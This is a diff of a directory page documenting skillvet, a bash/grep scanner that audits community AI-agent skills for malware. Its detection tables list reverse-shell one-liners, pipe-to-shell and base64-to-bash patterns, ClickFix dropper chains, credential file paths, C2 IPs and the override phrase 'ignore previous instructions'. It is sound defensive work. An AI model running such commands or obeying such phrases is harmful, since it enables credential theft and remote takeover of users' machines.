@@ -3,13 +3,14 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <meta name="description" content="Security scanner for ClawHub/community skills — detects malware, credential theft, exfiltration, prompt injection,">
+  <meta name="description" content="Security scanner for ClawHub/community skills — detects malware">
   <title>skillvet - OpenClaw Directory</title>
+  <link rel="canonical" href="https://moltdirectory.com/ai-llms/skillvet/">
   <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🦞</text></svg>">
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
-  <link rel="stylesheet" href="../../style.css">
+  <link rel="stylesheet" href="/style.css">
   <script>
     // Apply saved theme before page renders to prevent flash
     (function() {
@@ -23,12 +24,12 @@
 <body>
   <header class="header">
     <div class="header-inner">
-      <a href="../../index.html" class="logo">
+      <a href="/" class="logo">
 
         <span class="logo-text">OpenClaw Directory</span>
       </a>
       <nav class="header-links">
-        <a href="../../start-here/index.html" class="header-link">Start Here</a>
+        <a href="/start-here/" class="header-link">Start Here</a>
         <a href="/security-auditor" class="header-link">Security Auditor</a>
         <a href="https://github.com/neonone123/moltdirectory/issues/new?template=add-skill.yml" class="header-link" target="_blank" rel="noopener">Add Skill</a>
         <button class="theme-toggle" aria-label="Toggle theme" onclick="toggleTheme()">
@@ -44,13 +45,13 @@
   
           <section class="skill-page-header">
             <div class="skill-page-header-inner">
-              <a href="../index.html" class="back-link">← Back to AI & LLMs</a>
+              <a href="/ai-llms/" class="back-link">← Back to AI & LLMs</a>
               <div class="skill-page-meta">
-                <a href="../index.html" class="skill-page-category">AI & LLMs</a>
+                <a href="/ai-llms/" class="skill-page-category">AI & LLMs</a>
                 <span class="skill-page-author">by @oakencore</span>
               </div>
               <h1 class="skill-page-title">skillvet</h1>
-              <p class="skill-page-desc">Security scanner for ClawHub/community skills — detects malware, credential theft, exfiltration, prompt injection,</p>
+              <p class="skill-page-desc">Security scanner for ClawHub/community skills — detects malware</p>
             </div>
           </section>
           <div class="skill-page-body">
@@ -65,183 +66,419 @@
                 </div>
                 <div class="markdown-content">
                   <h1>Skillvet</h1>
-<p>Anyone can publish a skill to ClawHub. That&#39;s what makes it powerful — and risky. A single malicious skill can steal your API keys, exfiltrate your environment variables, inject prompts into your agent, or open a reverse shell on your machine.</p>
-<p>Skillvet scans skills <strong>before</strong> you use them. It runs 24 critical checks and 8 warning checks against every file in a skill directory, looking for credential theft, data exfiltration, prompt injection, obfuscation, and more. No dependencies — just bash and grep.</p>
+<p>Security scanner for agent skills. 48 critical checks, 8 warning checks. No dependencies — just bash and grep. Includes Tirith-inspired detection patterns, campaign signatures from <a href="https://www.koi.ai/blog/clawhavoc-341-malicious-clawedbot-skills-found-by-the-bot-they-were-targeting">Koi Security</a>, <a href="https://businessinsights.bitdefender.com/technical-advisory-openclaw-exploitation-enterprise-networks">Bitdefender</a>, <a href="https://snyk.io/articles/clawdhub-malicious-campaign-ai-agent-skills/">Snyk</a>, and <a href="https://1password.com/blog/from-magic-to-malware-how-openclaws-agent-skills-become-an-attack-surface">1Password</a> ClickFix patterns.</p>
 <h2>Usage</h2>
-<p><strong>Safe install</strong> — installs a skill, audits it, and auto-removes it if critical issues are found:</p>
+<p><strong>Safe install</strong> (installs, audits, auto-removes if critical):</p>
 <pre><code class="language-bash">bash skills/skillvet/scripts/safe-install.sh &lt;skill-slug&gt;
 </code></pre>
-<p><strong>Scan before installing</strong> — downloads a skill to a temp directory, scans it, deletes it:</p>
-<pre><code class="language-bash">bash skills/skillvet/scripts/scan-remote.sh &lt;skill-slug&gt;
-</code></pre>
-<p><strong>Audit a skill you already have:</strong></p>
+<p><strong>Audit an existing skill:</strong></p>
 <pre><code class="language-bash">bash skills/skillvet/scripts/skill-audit.sh skills/some-skill
 </code></pre>
-<p><strong>Audit every installed skill:</strong></p>
+<p><strong>Audit all installed skills:</strong></p>
 <pre><code class="language-bash">for d in skills/*/; do bash skills/skillvet/scripts/skill-audit.sh &quot;$d&quot;; done
 </code></pre>
-<p><strong>Diff scan</strong> — after an update, scan only what changed between versions:</p>
-<pre><code class="language-bash">bash skills/skillvet/scripts/diff-scan.sh skills/old-version skills/new-version
+<p><strong>JSON output</strong> (for automation):</p>
+<pre><code class="language-bash">bash skills/skillvet/scripts/skill-audit.sh --json skills/some-skill
 </code></pre>
-<p>Exit codes: <code>0</code> clean, <code>1</code> warnings only, <code>2</code> critical findings (blocked).</p>
-<h3>Output formats</h3>
-<p>All scripts accept <code>--json</code> for structured output and <code>--summary</code> for a single-line result.</p>
-<pre><code class="language-bash"># JSON — for CI pipelines and dashboards
-bash skills/skillvet/scripts/skill-audit.sh --json skills/some-skill
-
-# Summary — for batch scanning and notifications
-for d in skills/*/; do bash skills/skillvet/scripts/skill-audit.sh --summary &quot;$d&quot;; done
+<p><strong>SARIF output</strong> (for GitHub Code Scanning / VS Code):</p>
+<pre><code class="language-bash">bash skills/skillvet/scripts/skill-audit.sh --sarif skills/some-skill
 </code></pre>
-<h2>What it catches</h2>
-<h3>Critical — skill is blocked</h3>
+<p><strong>Summary mode</strong> (one-line per skill):</p>
+<pre><code class="language-bash">bash skills/skillvet/scripts/skill-audit.sh --summary skills/some-skill
+</code></pre>
+<p><strong>Verbose mode</strong> (debug which checks run and what files are scanned):</p>
+<pre><code class="language-bash">bash skills/skillvet/scripts/skill-audit.sh --verbose skills/some-skill
+</code></pre>
+<p><strong>Scan remote skill without installing:</strong></p>
+<pre><code class="language-bash">bash skills/skillvet/scripts/scan-remote.sh &lt;skill-slug&gt;
+</code></pre>
+<p><strong>Diff scan</strong> (only scan what changed between versions):</p>
+<pre><code class="language-bash">bash skills/skillvet/scripts/diff-scan.sh path/to/old-version path/to/new-version
+</code></pre>
+<p>Exit codes: <code>0</code> clean, <code>1</code> warnings only, <code>2</code> critical findings.</p>
+<h3>Advanced Options</h3>
 <table>
 <thead>
 <tr>
-<th>Check</th>
-<th>What it looks for</th>
+<th>Flag</th>
+<th>Description</th>
 </tr>
 </thead>
 <tbody><tr>
-<td>Exfiltration endpoints</td>
-<td>URLs pointing to webhook.site, ngrok.io, requestbin, etc.</td>
+<td><code>--json</code></td>
+<td>JSON output for CI/dashboards</td>
 </tr>
 <tr>
-<td>Env variable harvesting</td>
-<td>Bulk dumping of your shell environment</td>
+<td><code>--sarif</code></td>
+<td>SARIF v2.1.0 output for GitHub Code Scanning</td>
 </tr>
 <tr>
+<td><code>--summary</code></td>
+<td>One-line output per skill</td>
+</tr>
+<tr>
+<td><code>--verbose</code></td>
+<td>Show which checks run and which files are scanned</td>
+</tr>
+<tr>
+<td><code>--exclude-self</code></td>
+<td>Skip scan when scanning own source directory</td>
+</tr>
+<tr>
+<td><code>--max-file-size N</code></td>
+<td>Skip files larger than N bytes</td>
+</tr>
+<tr>
+<td><code>--max-depth N</code></td>
+<td>Limit directory traversal depth</td>
+</tr>
+</tbody></table>
+<h3>Suppressing False Positives</h3>
+<p>Create a <code>.skillvetrc</code> file in the skill directory to disable specific checks:</p>
+<pre><code># Disable check #4 (obfuscation) and #20 (shortened URLs)
+disable:4
+disable:20
+</code></pre>
+<p>Or add inline comments to suppress individual lines:</p>
+<pre><code class="language-js">const url = &quot;https://bit.ly/legit-link&quot;; // skillvet-ignore
+</code></pre>
+<h3>Pre-commit Hook</h3>
+<p>Install the git pre-commit hook to auto-scan skills before committing:</p>
+<pre><code class="language-bash">ln -sf ../../scripts/pre-commit-hook .git/hooks/pre-commit
+</code></pre>
+<h3>Risk Scoring</h3>
+<p>Each finding has a severity weight (1-10). The aggregate risk score is included in JSON, SARIF, and summary output. Higher scores indicate more dangerous patterns:</p>
+<ul>
+<li><strong>10</strong>: Reverse shells, known C2 IPs</li>
+<li><strong>9</strong>: Data exfiltration, pipe-to-shell, persistence + network, ClickFix, base64 execution</li>
+<li><strong>7-8</strong>: Credential theft, obfuscation, path traversal, time bombs</li>
+<li><strong>4-6</strong>: Punycode, homographs, ANSI injection, shortened URLs</li>
+<li><strong>2-3</strong>: Subprocess execution, network requests, file writes</li>
+</ul>
+<h2>Critical Checks (auto-blocked)</h2>
+<h3>Core Security Checks (1-24)</h3>
+<table>
+<thead>
+<tr>
+<th>#</th>
+<th>Check</th>
+<th>Example</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>1</td>
+<td>Known exfiltration endpoints</td>
+<td>webhook.site, ngrok.io, requestbin</td>
+</tr>
+<tr>
+<td>2</td>
+<td>Bulk env variable harvesting</td>
+<td><code>printenv |</code>, <code>${!*@}</code></td>
+</tr>
+<tr>
+<td>3</td>
 <td>Foreign credential access</td>
-<td>Reading API keys the skill doesn&#39;t own (ANTHROPIC_API_KEY, OPENAI_API_KEY, etc.)</td>
+<td>ANTHROPIC_API_KEY, TELEGRAM_BOT_TOKEN in scripts</td>
 </tr>
 <tr>
+<td>4</td>
 <td>Code obfuscation</td>
-<td>Dynamic code evaluation, base64 decode, hex escape sequences</td>
+<td>base64 decode, hex escapes, dynamic code generation</td>
 </tr>
 <tr>
-<td>Path traversal</td>
-<td>Reaching outside the skill directory into ~/.ssh, ~/.aws, /etc/passwd</td>
+<td>5</td>
+<td>Path traversal / sensitive files</td>
+<td><code>../../</code>, <code>~/.ssh</code>, <code>~/.clawdbot</code></td>
 </tr>
 <tr>
-<td>Data exfiltration</td>
-<td>Sending captured data out via curl or wget</td>
+<td>6</td>
+<td>Data exfiltration via curl/wget</td>
+<td><code>curl --data</code>, <code>wget --post</code> with variables</td>
 </tr>
 <tr>
+<td>7</td>
 <td>Reverse/bind shells</td>
-<td>Network backdoors via /dev/tcp, netcat, socat</td>
+<td><code>/dev/tcp/</code>, <code>nc -e</code>, <code>socat</code></td>
 </tr>
 <tr>
+<td>8</td>
 <td>.env file theft</td>
-<td>Loading .env files from scripts (not just referencing them in docs)</td>
+<td>dotenv loading in scripts (not docs)</td>
 </tr>
 <tr>
-<td>Prompt injection</td>
-<td>&quot;Ignore previous instructions&quot; and similar overrides in markdown</td>
+<td>9</td>
+<td>Prompt injection in markdown</td>
+<td>&quot;ignore previous instructions&quot; in SKILL.md</td>
 </tr>
 <tr>
+<td>10</td>
 <td>LLM tool exploitation</td>
-<td>Instructing the agent to send, email, or post secrets</td>
+<td>Instructions to send/email secrets</td>
 </tr>
 <tr>
+<td>11</td>
 <td>Agent config tampering</td>
-<td>Writing to AGENTS.md, SOUL.md, clawdbot.json, .bashrc</td>
+<td>Write/modify AGENTS.md, SOUL.md, clawdbot.json</td>
 </tr>
 <tr>
+<td>12</td>
 <td>Unicode obfuscation</td>
-<td>Zero-width characters, RTL overrides that hide content</td>
+<td>Zero-width chars, RTL override, bidi control chars</td>
 </tr>
 <tr>
+<td>13</td>
 <td>Suspicious setup commands</td>
-<td>Piping remote scripts to a shell interpreter in SKILL.md</td>
+<td>curl piped to bash in SKILL.md</td>
 </tr>
 <tr>
+<td>14</td>
 <td>Social engineering</td>
-<td>Telling users to download executables or run code from paste sites</td>
+<td>Download external binaries, paste-and-run instructions</td>
 </tr>
 <tr>
+<td>15</td>
 <td>Shipped .env files</td>
-<td>Actual .env files (not .example) included in the skill</td>
+<td>.env files (not .example) in the skill</td>
 </tr>
 <tr>
-<td>Homograph characters</td>
-<td>Cyrillic letters mimicking Latin (e.g., Cyrillic <code>a</code> posing as Latin <code>a</code> in URLs)</td>
+<td>16</td>
+<td>Homograph URLs <em>(Tirith)</em></td>
+<td>Cyrillic i vs Latin i in hostnames</td>
 </tr>
 <tr>
-<td>ANSI escape injection</td>
-<td>Raw terminal escape sequences in markdown, JSON, or YAML files</td>
+<td>17</td>
+<td>ANSI escape sequences <em>(Tirith)</em></td>
+<td>Terminal escape codes in code/data files</td>
 </tr>
 <tr>
-<td>Punycode domains</td>
-<td>xn-- encoded IDN labels that may hide homograph attacks</td>
+<td>18</td>
+<td>Punycode domains <em>(Tirith)</em></td>
+<td><code>xn--</code> prefixed IDN-encoded domains</td>
 </tr>
 <tr>
-<td>Double-encoded paths</td>
-<td>%25-based percent-encoding bypass attempts</td>
+<td>19</td>
+<td>Double-encoded paths <em>(Tirith)</em></td>
+<td><code>%25XX</code> percent-encoding bypass</td>
 </tr>
 <tr>
-<td>Shortened URLs</td>
-<td>bit.ly, t.co, tinyurl, etc. in code — hides true destination</td>
+<td>20</td>
+<td>Shortened URLs <em>(Tirith)</em></td>
+<td>bit.ly, t.co, tinyurl.com hiding destinations</td>
 </tr>
 <tr>
-<td>Insecure pipe-to-shell</td>
-<td>HTTP (no TLS) piped to a shell interpreter</td>
+<td>21</td>
+<td>Pipe-to-shell</td>
+<td><code>curl | bash</code> (HTTP and HTTPS)</td>
 </tr>
 <tr>
+<td>22</td>
 <td>String construction evasion</td>
-<td>Building dangerous calls from fragments (<code>&#39;ev&#39;+&#39;al&#39;</code>, bracket notation, <code>String.fromCharCode</code>, <code>getattr</code>)</td>
+<td>String.fromCharCode, getattr, dynamic call assembly</td>
 </tr>
 <tr>
+<td>23</td>
 <td>Data flow chain analysis</td>
-<td>Same file reads secrets/env, encodes data, AND sends network requests — exfiltration pipeline</td>
+<td>Same file reads secrets, encodes, AND sends network requests</td>
 </tr>
 <tr>
+<td>24</td>
 <td>Time bomb detection</td>
-<td>Date-gated or long-delayed execution (<code>Date.now() &gt; epoch</code>, <code>setTimeout</code> with 8+ digit delay, <code>schedule.every().days</code>)</td>
+<td><code>Date.now() &gt; timestamp</code>, <code>setTimeout(fn, 86400000)</code></td>
+</tr>
+<tr>
+<td>25</td>
+<td>Known C2/IOC IP blocklist</td>
+<td>91.92.242.30, 54.91.154.110 (known AMOS C2 servers)</td>
+</tr>
+<tr>
+<td>26</td>
+<td>Password-protected archives</td>
+<td>&quot;extract using password: openclaw&quot; — AV evasion</td>
+</tr>
+<tr>
+<td>27</td>
+<td>Paste service payloads</td>
+<td>glot.io, pastebin.com hosting malicious scripts</td>
+</tr>
+<tr>
+<td>28</td>
+<td>GitHub releases binary downloads</td>
+<td>Fake prerequisites pointing to <code>.zip</code>/<code>.exe</code> on GitHub</td>
+</tr>
+<tr>
+<td>29</td>
+<td>Base64 pipe-to-interpreter</td>
+<td><code>echo &#39;...&#39; | base64 -D | bash</code> — primary macOS vector</td>
+</tr>
+<tr>
+<td>30</td>
+<td>Subprocess + network commands</td>
+<td>hidden pipe-to-shell in Python/JS code</td>
+</tr>
+<tr>
+<td>31</td>
+<td>Fake URL misdirection <em>(warning)</em></td>
+<td>decoy URL before real payload</td>
+</tr>
+<tr>
+<td>32</td>
+<td>Process persistence + network</td>
+<td><code>nohup curl ... &amp;</code> — backdoor with network access</td>
+</tr>
+<tr>
+<td>33</td>
+<td>Fake prerequisite pattern</td>
+<td>&quot;Prerequisites&quot; section with sketchy external downloads</td>
+</tr>
+<tr>
+<td>34</td>
+<td>xattr/chmod dropper</td>
+<td>macOS Gatekeeper bypass: download, <code>xattr -c</code>, <code>chmod +x</code>, execute</td>
+</tr>
+<tr>
+<td>35</td>
+<td>ClickFix download+execute chain</td>
+<td><code>curl -o /tmp/x &amp;&amp; chmod +x &amp;&amp; ./x</code>, <code>open -a</code> with downloads</td>
+</tr>
+<tr>
+<td>36</td>
+<td>Suspicious package sources</td>
+<td><code>pip install git+https://...</code>, npm from non-official registries</td>
+</tr>
+<tr>
+<td>37</td>
+<td>Staged installer pattern</td>
+<td>Fake dependency names like <code>openclaw-core</code>, <code>some-lib</code></td>
+</tr>
+<tr>
+<td>38</td>
+<td>Fake OS update social engineering</td>
+<td>&quot;Apple Software Update required for compatibility&quot;</td>
+</tr>
+<tr>
+<td>39</td>
+<td>Known malicious ClawHub actors</td>
+<td>zaycv, Ddoy233, Sakaen736jih, Hightower6eu references</td>
+</tr>
+<tr>
+<td>40</td>
+<td>Bash /dev/tcp reverse shell</td>
+<td><code>bash -i &gt;/dev/tcp/IP/PORT 0&gt;&amp;1</code> (AuthTool pattern)</td>
+</tr>
+<tr>
+<td>41</td>
+<td>Nohup backdoor</td>
+<td><code>nohup bash -c &#39;...&#39; &gt;/dev/null</code> with network commands</td>
+</tr>
+<tr>
+<td>42</td>
+<td>Python reverse shell</td>
+<td><code>socket.connect</code> + <code>dup2</code>, <code>pty.spawn(&#39;/bin/bash&#39;)</code></td>
+</tr>
+<tr>
+<td>43</td>
+<td>Terminal output disguise</td>
+<td>Decoy &quot;downloading...&quot; message before malicious payload</td>
+</tr>
+<tr>
+<td>44</td>
+<td>Credential file access</td>
+<td>Direct reads of <code>.env</code>, <code>.pem</code>, <code>.aws/credentials</code></td>
+</tr>
+<tr>
+<td>45</td>
+<td>TMPDIR payload staging</td>
+<td>AMOS pattern: drop malware to <code>$TMPDIR</code> then execute</td>
+</tr>
+<tr>
+<td>46</td>
+<td>GitHub raw content execution</td>
+<td><code>curl raw.githubusercontent.com/... | bash</code></td>
+</tr>
+<tr>
+<td>47</td>
+<td>Echo-encoded payloads</td>
+<td>Long base64 strings echoed and piped to decoders</td>
+</tr>
+<tr>
+<td>48</td>
+<td>Typosquat skill names</td>
+<td><code>clawdhub-helper</code>, <code>openclaw-cli</code>, <code>skillvet1</code></td>
 </tr>
 </tbody></table>
-<h3>Warnings — flagged for manual review</h3>
+<h2>Warning Checks (flagged for review)</h2>
 <table>
 <thead>
 <tr>
+<th>#</th>
 <th>Check</th>
-<th>What it looks for</th>
+<th>Example</th>
 </tr>
 </thead>
 <tbody><tr>
-<td>Subprocess spawning</td>
-<td>Code that launches child processes or shell commands</td>
+<td>W1</td>
+<td>Unknown external tool requirements</td>
+<td>Non-standard CLI tools in install instructions</td>
 </tr>
 <tr>
+<td>W2</td>
+<td>Subprocess execution</td>
+<td>child_process, execSync, spawn, subprocess</td>
+</tr>
+<tr>
+<td>W3</td>
 <td>Network requests</td>
-<td>HTTP client libraries (axios, fetch, requests, httpx)</td>
+<td>axios, fetch, requests imports</td>
 </tr>
 <tr>
+<td>W4</td>
 <td>Minified/bundled files</td>
-<td>JS/TS files with very long lines that can&#39;t be audited by eye</td>
+<td>First line &gt;500 chars — can&#39;t audit</td>
 </tr>
 <tr>
-<td>File write operations</td>
-<td>Code that writes to the filesystem</td>
+<td>W5</td>
+<td>Filesystem write operations</td>
+<td>writeFile, open(&#39;w&#39;), fs.append</td>
 </tr>
 <tr>
-<td>Unknown external tools</td>
-<td>CLI tools referenced in docs that aren&#39;t on the known-safe list</td>
-</tr>
-<tr>
+<td>W6</td>
 <td>Insecure transport</td>
-<td>Disabled TLS certificate verification</td>
+<td><code>curl -k</code>, <code>verify=False</code> — TLS disabled</td>
 </tr>
 <tr>
-<td>Raw IP URLs</td>
-<td>HTTP to non-private IPs — bypasses DNS, harder to trace</td>
-</tr>
-<tr>
-<td>Untrusted Docker registries</td>
-<td>Docker pull/run from third-party registries</td>
+<td>W7</td>
+<td>Docker untrusted registries</td>
+<td>Non-standard image sources</td>
 </tr>
 </tbody></table>
+<h2>Scanned File Types</h2>
+<p><code>.md</code>, <code>.js</code>, <code>.ts</code>, <code>.tsx</code>, <code>.jsx</code>, <code>.py</code>, <code>.sh</code>, <code>.bash</code>, <code>.rs</code>, <code>.go</code>, <code>.rb</code>, <code>.c</code>, <code>.cpp</code>, <code>.json</code>, <code>.yaml</code>, <code>.yml</code>, <code>.toml</code>, <code>.txt</code>, <code>.env*</code>, <code>Dockerfile*</code>, <code>Makefile</code>, <code>pom.xml</code>, <code>.gradle</code>.</p>
+<p>Binary files are automatically skipped. Symlinks are followed.</p>
+<h2>Portability</h2>
+<p>Works on Linux and macOS. Unicode checks (#12, #16, #17) use <code>grep -P</code> where available, falling back to <code>perl</code> on systems without Perl-compatible regex (e.g., stock macOS). If neither is available, those checks are silently skipped.</p>
+<h2>IOC Updates</h2>
+<p>The C2 IP blocklist in check #25 is based on known indicators from:</p>
+<ul>
+<li><a href="https://www.koi.ai/blog/clawhavoc-341-malicious-clawedbot-skills-found-by-the-bot-they-were-targeting">Koi Security report</a> (Feb 2026)</li>
+<li><a href="https://thehackernews.com/2026/02/researchers-find-341-malicious-clawhub.html">The Hacker News coverage</a></li>
+<li><a href="https://opensourcemalware.com/blog/clawdbot-skills-ganked-your-crypto">OpenSourceMalware analysis</a></li>
+</ul>
+<p>To update IOCs, edit the <code>KNOWN_IPS</code> entry in <code>scripts/patterns.b64</code> (base64-encoded regex pattern).</p>
+<h2>CI/CD Integration</h2>
+<h3>GitHub Actions</h3>
+<p>A <code>.github/workflows/test.yml</code> is included — runs the test suite on both Ubuntu and macOS on push/PR.</p>
+<h3>GitHub Code Scanning (SARIF)</h3>
+<pre><code class="language-yaml">- name: Run skillvet
+  run: bash scripts/skill-audit.sh --sarif skills/some-skill &gt; results.sarif || true
+
+- name: Upload SARIF
+  uses: github/codeql-action/upload-sarif@v3
+  with:
+    sarif_file: results.sarif
+</code></pre>
 <h2>Limitations</h2>
-<p>This is static analysis — pattern matching with grep. It raises the bar significantly but doesn&#39;t guarantee safety. Minified JS is flagged but not deobfuscated. Prompt injection detection is English-centric.</p>
-<p>The scanner flags itself when audited. Its own source code contains the patterns it detects. This is expected.</p>
+<p>Static analysis only. English-centric prompt injection patterns. Minified JS is flagged but not deobfuscated. A clean scan raises the bar but doesn&#39;t guarantee safety.</p>
+<p>The scanner flags itself when audited — its own patterns contain the strings it detects. Use <code>--exclude-self</code> to skip self-scanning in CI.</p>
 
                 </div>
               </div>
